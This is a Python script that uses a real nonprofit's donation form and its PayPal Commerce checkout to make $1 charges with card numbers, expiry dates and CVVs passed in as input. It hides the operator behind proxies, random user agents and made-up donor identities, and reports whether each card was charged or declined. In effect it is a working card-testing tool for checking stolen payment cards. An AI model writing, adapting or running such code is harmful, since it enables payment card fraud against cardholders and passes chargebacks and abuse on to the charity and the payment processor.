import requests
import re
import json
import base64
import random
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

fake = Faker()

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip_code = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip_code, phone

def _run_paypal_charge2_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    email, name, add, city, zip_code, phone = gdata()
    u = generate_user_agent()

    # 1. Fetch Form
    try:
        resp = session.get('https://awwatersheds.org/donate/', headers={'User-Agent': u}, timeout=20)
        html = resp.text
        v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
        v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
        x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
        x23 = re.search(r'"data-client-token":"([^"]+)"', html).group(1)
        
        x24 = base64.b64decode(x23).decode()
        x25 = json.loads(x24)
        access_token = x25['paypal']['accessToken']
    except Exception as exc:
        return False, f"Failed to retrieve form details: {str(exc)}"

    headers_ajax = {
        'authority': 'awwatersheds.org',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryMxr4PdnqPmsBg69V',
        'origin': 'https://awwatersheds.org',
        'referer': 'https://awwatersheds.org/donate/',
        'user-agent': u,
    }

    files_init = {
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, v1),
        'give-form-id': (None, v2),
        'give-form-title': (None, 'Donate Now'),
        'give-current-url': (None, 'https://awwatersheds.org/donate/'),
        'give-form-url': (None, 'https://awwatersheds.org/donate/'),
        'give-form-minimum': (None, '1'),
        'give-form-maximum': (None, '1000000'),
        'give-form-hash': (None, x1),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        'give_recurring_donation_details': (None, '{"is_recurring":false}'),
        'give-amount': (None, '1'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, name.split()[0]),
        'give_last': (None, name.split()[1] if len(name.split()) > 1 else name),
        'give_email': (None, email),
        'give_comment': (None, ''),
        'give_lake_affiliation': (None, 'Lovell Lake'),
        'give_lake_affiliation_other': (None, ''),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give_action': (None, 'purchase'),
        'give-gateway': (None, 'paypal-commerce'),
        'action': (None, 'give_process_donation'),
        'give_ajax': (None, 'true'),
    }

    try:
        session.post('https://awwatersheds.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers_ajax, files=files_init, timeout=20)
    except Exception as exc:
        return False, f"Donation initialization failed: {str(exc)}"

    # 2. Create Order
    headers_order = {
        'authority': 'awwatersheds.org',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://awwatersheds.org',
        'referer': 'https://awwatersheds.org/donate/',
        'user-agent': u,
    }

    files_order = {
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, v1),
        'give-form-id': (None, v2),
        'give-form-title': (None, 'Donate Now'),
        'give-current-url': (None, 'https://awwatersheds.org/donate/'),
        'give-form-url': (None, 'https://awwatersheds.org/donate/'),
        'give-form-minimum': (None, '1'),
        'give-form-maximum': (None, '1000000'),
        'give-form-hash': (None, x1),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        'give_recurring_donation_details': (None, '{"is_recurring":false}'),
        'give-amount': (None, '1'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, name),
        'give_last': (None, name),
        'give_email': (None, email),
        'give_comment': (None, ''),
        'give_lake_affiliation': (None, 'Lovell Lake'),
        'give_lake_affiliation_other': (None, ''),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    }

    try:
        resp_order = session.post(
            'https://awwatersheds.org/wp-admin/admin-ajax.php',
            params={'action': 'give_paypal_commerce_create_order'},
            cookies=session.cookies,
            headers=headers_order,
            files=files_order,
            timeout=20
        )
        xdata = resp_order.json()['data']['id']
    except Exception as exc:
        return False, f"Failed to create PayPal order: {str(exc)}"

    # 3. Confirm Payment Source
    headers_options = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'access-control-request-headers': 'authorization,braintree-sdk-version,content-type,paypal-client-metadata-id',
        'access-control-request-method': 'POST',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': u,
    }

    try:
        session.options(f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source', headers=headers_options, timeout=10)
    except Exception:
        pass

    headers_confirm = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {access_token}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': u,
    }

    exp_year = str(ano)
    if len(exp_year) == 2:
        exp_year = "20" + exp_year
    exp_month = str(mes).zfill(2)
    expiry_str = f"{exp_year}-{exp_month}"

    json_confirm = {
        'payment_source': {
            'card': {
                'number': cc,
                'expiry': expiry_str,
                'security_code': cvv,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }

    try:
        resp_confirm = session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
            headers=headers_confirm,
            json=json_confirm,
            timeout=20
        )
        confirm_data = resp_confirm.json()
        
        if 'name' in confirm_data and confirm_data['name'] == 'UNPROCESSABLE_ENTITY':
            details = confirm_data.get('details', [])
            if details:
                return False, details[0].get('description', 'Unprocessable Entity')
            return False, "Unprocessable Entity"
        elif 'error' in confirm_data:
            return False, confirm_data.get('error_description', 'Decline / Card validation failure')
    except Exception as exc:
        return False, f"Payment source confirmation error: {str(exc)}"

    # 4. Approve Order
    headers_approve = {
        'Accept': '*/*',
        'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': 'https://awwatersheds.org',
        'Referer': 'https://awwatersheds.org/donate/',
        'User-Agent': u,
    }

    files_approve = {
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, v1),
        'give-form-id': (None, v2),
        'give-form-title': (None, 'Donate Now'),
        'give-current-url': (None, 'https://awwatersheds.org/donate/'),
        'give-form-url': (None, 'https://awwatersheds.org/donate/'),
        'give-form-minimum': (None, '1'),
        'give-form-maximum': (None, '1000000'),
        'give-form-hash': (None, x1),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        'give_recurring_donation_details': (None, '{"is_recurring":false}'),
        'give-amount': (None, '1'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, name),
        'give_last': (None, name),
        'give_email': (None, email),
        'give-gateway': (None, 'paypal-commerce'),
    }

    try:
        resp_approve = session.post(
            'https://awwatersheds.org/wp-admin/admin-ajax.php',
            params={'action': 'give_paypal_commerce_approve_order', 'order': xdata},
            cookies=session.cookies,
            headers=headers_approve,
            files=files_approve,
            timeout=25
        )
        resp_text = resp_approve.text
        
        if "donation_id" in resp_text or "success" in resp_text.lower():
            return True, "CARD_CHARGED_SUCCESS"
        
        try:
            res_json = resp_approve.json()
            if res_json.get('success') is True:
                return True, "CARD_CHARGED_SUCCESS"
            if 'data' in res_json and isinstance(res_json['data'], str):
                return False, res_json['data']
        except Exception:
            pass

        clean_err = re.sub(r'<[^>]+>', ' ', resp_text).strip()
        clean_err = re.sub(r'\s+', ' ', clean_err)
        if len(clean_err) > 150:
            clean_err = clean_err[:147] + "..."
        return False, clean_err or "Order approval failed"
    except Exception as exc:
        return False, f"Approval request error: {str(exc)}"

async def process_paypal_charge2(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_paypal_charge2_sync, cc, mes, ano, cvv, proxy_str)
